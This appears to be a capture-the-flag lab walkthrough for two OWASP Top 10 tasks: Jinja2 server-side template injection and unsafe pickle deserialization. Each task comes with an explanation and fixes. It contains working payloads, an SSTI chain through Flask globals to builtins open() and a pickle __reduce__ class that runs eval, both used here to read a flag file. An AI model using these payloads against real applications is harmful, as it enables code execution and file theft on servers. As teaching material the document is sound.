# OWASP Top 10 2025: Insecure Data Handling

## Task 3: A05: Injection

This lab renders raw user input in a Jinja2 template using `render_template_string`.

### Test Payloads:

- `{{7*7}}`
- `{{config.items()}}`

These payloads confirm code execution and allow exploration of objects.

### Why This is Vulnerable:

- **User-controlled strings**: Evaluated as templates.
- **Access to config**: Attackers can reach config, call Python builtins, or leverage objects to access host resources.

### Solution:

1. Prove code execution:

   ```plaintext
   Submit {{ 7 * 7 }} to confirm expressions are evaluated.
   ```

2. Discover exposed objects:

   ```plaintext
   Use {{ config.items() }} or {{ request.__dict__ }}.
   ```

3. Exploit Flask globals:

   ```plaintext
   Run {{ request.application.__globals__.__builtins__.open('flag.txt').read() }} to read the file on the server.
   ```

### Why It Works:

- `request.application` leads to Flask internals, allowing access to the raw builtins namespace and the `open()` function.

---

## Task 4: A08: Software or Data Integrity Failures

The app deserializes untrusted pickle data, allowing attackers to execute arbitrary code and access sensitive files.

### Why This is Vulnerable:

- **No integrity verification**: The app accepts any pickle data without checking signatures or hashes.
- **Unsafe deserialization**: Python's pickle can execute arbitrary code during deserialization.
- **Trust boundary violation**: Untrusted user input is deserialized as if it came from a trusted source.
- **No input validation**: No schema validation or whitelisting of allowed object types.

### Solution:

```python
import pickle
import base64

class Malicious:
    def __reduce__(self):
        # Return a tuple: (callable, args)
        # This will execute: open('flag.txt').read()
        return (eval, ("open('flag.txt').read()",))

# Generate and encode the payload
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)
```

### Fix:

- Use safe serialization formats (e.g., JSON, YAML with `safe_load`).
- Verify digital signatures before deserializing.
- Whitelist allowed object types.
- Use restricted unpicklers or sandboxed environments.
- Never deserialize untrusted data.

---

## Appendix

